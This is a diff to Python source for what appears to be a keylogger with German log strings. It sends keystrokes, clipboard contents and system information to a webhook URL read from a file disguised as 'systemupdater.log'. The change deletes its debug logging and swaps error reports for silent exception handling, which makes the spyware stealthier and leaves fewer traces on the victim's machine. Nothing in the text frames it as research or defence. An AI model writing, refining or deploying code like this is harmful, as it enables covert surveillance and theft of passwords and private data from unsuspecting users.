@@ -28,14 +28,6 @@ def get_active_mac():
 
 DEVICE_ID = f"DEVICE-{get_active_mac().replace(':', '')}"
 
-def write_debug_log(message):
-    try:
-        path = os.path.join(os.environ["USERPROFILE"], "debug.log")
-        with open(path, "a", encoding="utf-8") as f:
-            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
-    except:
-        pass
-
 def load_webhook_from_file(filename="systemupdater.log"):
     try:
         exe_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
@@ -44,13 +36,12 @@ def load_webhook_from_file(filename="systemupdater.log"):
             for line in f:
                 if line.strip().startswith("http"):
                     return line.strip()
-    except Exception as e:
-        write_debug_log(f"Fehler beim Laden der Webhook-URL: {e}")
+    except:
+        pass
     return None
 
 WEBHOOK_URL = load_webhook_from_file()
 if not WEBHOOK_URL:
-    write_debug_log("Webhook-URL fehlt oder ungültig.")
     os._exit(0)
 
 log_entries = []
@@ -119,15 +110,15 @@ def send_buffer():
                 try:
                     requests.post(WEBHOOK_URL, json={"content": get_system_info()})
                     systeminfo_sent = True
-                except Exception as e:
-                    write_debug_log(f"Systeminfo-Fehler: {e}")
+                except:
+                    pass
             ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             header = f"**Tastenlog {ts}**\n"
             content = "\n".join(log_entries) if log_entries else "_[Keine Eingaben in dieser Minute]_"
             try:
                 send_text_in_chunks(content, prefix=header)
-            except Exception as e:
-                write_debug_log(f"Sende-Fehler: {e}")
+            except:
+                pass
             log_entries.clear()
 
 def monitor_clipboard():
@@ -140,8 +131,8 @@ def monitor_clipboard():
                 ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 msg = f"**Zwischenablage {ts}:**\n```{clip}```"
                 requests.post(WEBHOOK_URL, json={"content": msg})
-        except Exception as e:
-            write_debug_log(f"Clipboard-Fehler: {e}")
+        except:
+            pass
         time.sleep(1)
 
 def on_press(key):
